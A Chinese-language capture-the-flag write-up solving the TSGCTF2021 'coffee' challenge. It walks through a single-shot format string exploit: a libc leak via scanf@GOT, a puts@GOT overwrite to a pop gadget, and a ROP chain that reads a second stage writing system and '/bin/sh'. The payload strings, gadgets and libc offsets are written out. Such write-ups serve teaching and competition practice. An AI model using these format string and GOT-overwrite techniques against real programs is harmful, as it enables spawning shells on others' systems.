# TSGCTF2021 coffee WP

## 题目简述

程序只有一次格式化字符串执行机会：

```c
int x = 0xc0ffee;

int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

二进制无 PIE、NX 开启、Partial RELRO，因此 GOT 可写且代码地址固定。难点是必须在不超过 159 字节的一次 `printf` 中同时安排地址泄露、GOT 改写和后续控制流。

## 解题过程

第一阶段格式串完成两件事。首先用 `%s` 读取 `scanf@GOT`，泄露 libc 地址：

```text
%23$s
```

其次把 `puts@GOT` 改为二进制中 `0x40128b` 处的多寄存器 `pop ...; ret` gadget。官方 payload 先向 `puts@GOT` 写入低位 `0x128b`，再向 `puts@GOT+2` 写入字节 `0x40`，最终组成固定代码地址：

```python
fmt = b"%4747c%21$lln%181c%22$hhn"
```

格式串后面直接排列 ROP 链和三个作为格式串参数使用的地址。`printf` 返回后，程序执行 `puts("bye")`；由于 GOT 已改写，这次调用进入弹栈 gadget，栈指针随即落到同一输入缓冲区中的 ROP。

ROP 先调用：

```c
scanf("%s", puts_got);
```

对应链为：

```text
pop rdi; ret        -> "%s"
pop rsi; pop r15; ret -> puts@GOT, dummy
ret                 -> 栈对齐
scanf@PLT
```

在第一阶段泄露与 ROP 执行之间，客户端从 `scanf@GOT` 的输出计算：

```python
libc_base = leaked_scanf - 0x66230
system = libc_base + 0x55410
```

随后给 ROP 中的 `scanf` 发送第二阶段：

```python
p64(system) + b"\x00/bin/sh\x00"
```

它把 `puts@GOT` 改成 `system`，并在 `puts@GOT+9` 放置 `/bin/sh`。ROP 的最后部分调用 `puts@PLT(puts_got+9)`，实际变为：

```c
system("/bin/sh");
```

取得 shell 后读取 flag，得到：

```text
TSGCTF{Uhouho_gori_gori_pwn}
```

## 方法总结

本题把一次格式化字符串拆成“泄露 + 改写控制流入口”，再借被劫持的 `puts` 接入输入缓冲区中的 ROP，最终获得第二次任意数据写入机会。单次漏洞触发并不等于只能完成一个动作；只要可同时输出内存、写 GOT 并控制后续调用，就能把一次性原语扩展成多阶段利用。Full RELRO、固定格式字符串和 PIE 都能显著破坏这条链。
